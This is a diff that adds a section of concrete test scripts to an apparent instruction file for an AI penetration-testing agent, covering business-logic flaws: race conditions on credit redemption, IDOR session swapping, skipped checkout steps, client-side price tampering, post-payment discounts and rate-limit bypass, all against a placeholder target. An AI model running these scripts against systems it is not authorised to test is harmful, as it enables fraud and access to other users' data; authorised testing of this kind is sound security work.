@@ -154,6 +154,315 @@
 - Privilege retention or unauthorized access to premium features
 </impact>
 
+<execution_patterns>
+<title>CONCRETE EXECUTION PATTERNS FOR LOGIC BUG TESTING</title>
+
+<critical>The methodology above describes WHAT to test. This section describes HOW to execute tests using available tools.</critical>
+
+<pattern_race_conditions>
+**Testing Race Conditions with Python:**
+```python
+# Use python tool to create and run this script
+import asyncio
+import aiohttp
+
+async def test_race_condition(url, payload, count=10):
+    """Send parallel requests to test for race conditions."""
+    async with aiohttp.ClientSession() as session:
+        tasks = [session.post(url, json=payload) for _ in range(count)]
+        responses = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        # Analyze responses
+        success_count = sum(1 for r in responses if hasattr(r, 'status') and r.status == 200)
+        print(f"Sent {count} parallel requests, {success_count} succeeded")
+        
+        # Check for atomicity violation
+        if success_count > 1:
+            print("[!] RACE CONDITION DETECTED: Multiple successes for single-use resource")
+            return True
+    return False
+
+# Example: Test credit redemption
+asyncio.run(test_race_condition(
+    "https://target.com/api/redeem",
+    {"credit_id": "CREDIT-123"},
+    count=20
+))
+```
+
+**Testing Race Conditions with Browser JavaScript:**
+```javascript
+// Use browser_action with execute_js
+const promises = [];
+for (let i = 0; i < 10; i++) {
+    promises.push(
+        fetch('/api/redeem-credit', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({credit_id: 'CREDIT-123'})
+        })
+    );
+}
+
+Promise.all(promises).then(responses => {
+    const successes = responses.filter(r => r.ok).length;
+    console.log(`Race test: ${successes}/10 succeeded`);
+    if (successes > 1) {
+        console.log('[!] RACE CONDITION DETECTED');
+    }
+});
+```
+</pattern_race_conditions>
+
+<pattern_idor_session_swap>
+**Testing IDOR with Session Swapping:**
+```python
+# Use python tool to create multi-session test
+import requests
+
+def test_idor(target_url, victim_session, attacker_session, resource_id):
+    """Test if attacker can access victim's resource."""
+    
+    # Step 1: Victim creates/accesses resource
+    victim = requests.Session()
+    victim.cookies.set('session', victim_session)
+    victim_response = victim.get(f"{target_url}/api/orders/{resource_id}")
+    
+    if victim_response.status_code != 200:
+        print("[-] Victim cannot access resource")
+        return False
+    
+    victim_data = victim_response.json()
+    print(f"[+] Victim's data: {victim_data.get('email', 'N/A')}")
+    
+    # Step 2: Attacker attempts to access same resource
+    attacker = requests.Session()
+    attacker.cookies.set('session', attacker_session)
+    attacker_response = attacker.get(f"{target_url}/api/orders/{resource_id}")
+    
+    if attacker_response.status_code == 200:
+        attacker_data = attacker_response.json()
+        if attacker_data.get('email') == victim_data.get('email'):
+            print("[!] IDOR DETECTED: Attacker accessed victim's data")
+            return True
+    
+    print("[-] IDOR not present: Access denied")
+    return False
+
+# Execute test
+test_idor(
+    "https://target.com",
+    victim_session="victim_token_here",
+    attacker_session="attacker_token_here",
+    resource_id="12345"
+)
+```
+</pattern_idor_session_swap>
+
+<pattern_state_machine_violation>
+**Testing Step Skipping/Reordering:**
+```python
+# Use python tool for workflow manipulation
+import requests
+
+def test_step_skipping(base_url, session_token):
+    """Test if workflow steps can be skipped."""
+    session = requests.Session()
+    session.headers.update({'Authorization': f'Bearer {session_token}'})
+    
+    # Normal flow: create_order → add_items → checkout → pay
+    # Test: Skip checkout, go directly to pay
+    
+    # Step 1: Create order
+    order_resp = session.post(f"{base_url}/api/orders")
+    order_id = order_resp.json()['order_id']
+    print(f"[+] Created order: {order_id}")
+    
+    # Step 2: Add items
+    session.post(f"{base_url}/api/orders/{order_id}/items", 
+                 json={"product_id": "PROD-123", "quantity": 1})
+    
+    # Step 3: SKIP checkout, go directly to payment
+    payment_resp = session.post(f"{base_url}/api/orders/{order_id}/pay",
+                                 json={"method": "credit_card"})
+    
+    if payment_resp.status_code == 200:
+        print("[!] LOGIC FLAW: Payment succeeded without checkout validation")
+        return True
+    else:
+        print("[-] Step skipping prevented")
+        return False
+
+test_step_skipping("https://target.com", "your_token_here")
+```
+</pattern_state_machine_violation>
+
+<pattern_price_manipulation>
+**Testing Client-Side Price Manipulation:**
+```python
+# Use python tool to test price tampering
+import requests
+
+def test_price_manipulation(base_url, session_token):
+    """Test if client-submitted prices are trusted."""
+    session = requests.Session()
+    session.headers.update({'Authorization': f'Bearer {session_token}'})
+    
+    # Step 1: Add item to cart (observe real price)
+    add_resp = session.post(f"{base_url}/api/cart/add",
+                            json={"product_id": "PROD-123", "quantity": 1})
+    real_price = add_resp.json().get('price', 100.00)
+    print(f"[+] Real price: ${real_price}")
+    
+    # Step 2: Attempt checkout with manipulated price
+    checkout_resp = session.post(f"{base_url}/api/checkout",
+                                 json={
+                                     "items": [{
+                                         "product_id": "PROD-123",
+                                         "quantity": 1,
+                                         "price": 0.01  # Manipulated price
+                                     }],
+                                     "total": 0.01
+                                 })
+    
+    if checkout_resp.status_code == 200:
+        charged_amount = checkout_resp.json().get('charged', 0)
+        if charged_amount < real_price:
+            print(f"[!] PRICE MANIPULATION: Charged ${charged_amount} instead of ${real_price}")
+            return True
+    
+    print("[-] Price manipulation prevented")
+    return False
+
+test_price_manipulation("https://target.com", "your_token_here")
+```
+</pattern_price_manipulation>
+
+<pattern_browser_workflow>
+**Testing Complex UI Workflows with Browser:**
+```python
+# Use browser_action tool for multi-step UI flows
+# Example: Test if discount can be applied after payment
+
+# Step 1: Launch browser and login
+browser_action(action="launch", url="https://target.com/login")
+browser_action(action="type", text="user@example.com", coordinate="email_field")
+browser_action(action="type", text="password123", coordinate="password_field")
+browser_action(action="click", coordinate="login_button")
+
+# Step 2: Add item and proceed to checkout
+browser_action(action="goto", url="https://target.com/products/123")
+browser_action(action="click", coordinate="add_to_cart_button")
+browser_action(action="goto", url="https://target.com/checkout")
+
+# Step 3: Complete payment
+browser_action(action="click", coordinate="pay_now_button")
+browser_action(action="wait", duration=2.0)
+
+# Step 4: Attempt to apply discount AFTER payment
+# (This should fail, but test if state machine allows it)
+browser_action(action="execute_js", js_code="""
+    fetch('/api/apply-discount', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({discount_code: 'SAVE50', order_id: window.currentOrderId})
+    }).then(r => r.json()).then(data => {
+        console.log('Discount application result:', data);
+        if (data.success) {
+            console.log('[!] LOGIC FLAW: Discount applied after payment');
+        }
+    });
+""")
+
+# Step 5: Check console logs for results
+browser_action(action="get_console_logs")
+```
+</pattern_browser_workflow>
+
+<pattern_quota_bypass>
+**Testing Quota/Limit Bypass:**
+```python
+# Use python tool for limit testing
+import requests
+from datetime import datetime
+
+def test_rate_limit_bypass(url, session_token, limit=10):
+    """Test if rate limits can be bypassed."""
+    session = requests.Session()
+    session.headers.update({'Authorization': f'Bearer {session_token}'})
+    
+    success_count = 0
+    for i in range(limit * 2):  # Try double the limit
+        resp = session.post(f"{url}/api/action")
+        if resp.status_code == 200:
+            success_count += 1
+            print(f"[+] Request {i+1}: Success")
+        elif resp.status_code == 429:
+            print(f"[-] Request {i+1}: Rate limited")
+        
+    if success_count > limit:
+        print(f"[!] QUOTA BYPASS: {success_count}/{limit*2} succeeded (limit: {limit})")
+        return True
+    else:
+        print(f"[-] Rate limit enforced: {success_count}/{limit} allowed")
+        return False
+
+test_rate_limit_bypass("https://target.com", "your_token_here", limit=10)
+```
+</pattern_quota_bypass>
+
+<tool_selection_guide>
+**When to use each tool:**
+
+1. **python tool** (PREFERRED for most logic tests):
+   - Race conditions (asyncio/aiohttp)
+   - IDOR testing (multi-session)
+   - State machine violations
+   - Price/total manipulation
+   - Quota/limit bypass
+   - Any test requiring precise control and logging
+
+2. **browser_action tool**:
+   - Complex UI workflows
+   - JavaScript-heavy applications
+   - Testing client-side validation bypass
+   - Workflows requiring visual confirmation
+   - Cookie/localStorage manipulation
+
+3. **terminal tool**:
+   - Running specialized tools (sqlmap, nuclei)
+   - Batch testing with curl/httpie
+   - Quick one-off requests
+
+4. **proxy tool**:
+   - Inspecting traffic from browser tests
+   - Capturing tokens/session IDs
+   - Analyzing request/response patterns
+</tool_selection_guide>
+
+<automation_mandate>
+**CRITICAL: Always automate logic bug testing**
+
+DO NOT manually click through workflows in the browser. Instead:
+1. Write a Python script that executes the test
+2. Save it to /workspace/logic_test_[description].py
+3. Run it with the python tool
+4. Capture and analyze the output
+
+Manual testing is:
+- Not reproducible
+- Not scalable
+- Not auditable
+- Prone to human error
+
+Automated scripts are:
+- Reproducible (can be run by validation agent)
+- Fast (can test race conditions)
+- Auditable (clear evidence)
+- Scalable (easy to modify and extend)
+</automation_mandate>
+</execution_patterns>
+
 <pro_tips>
 1. Start from invariants and ledgers, not UI—prove conservation of value breaks.
 2. Test with time and concurrency; many bugs only appear under pressure.
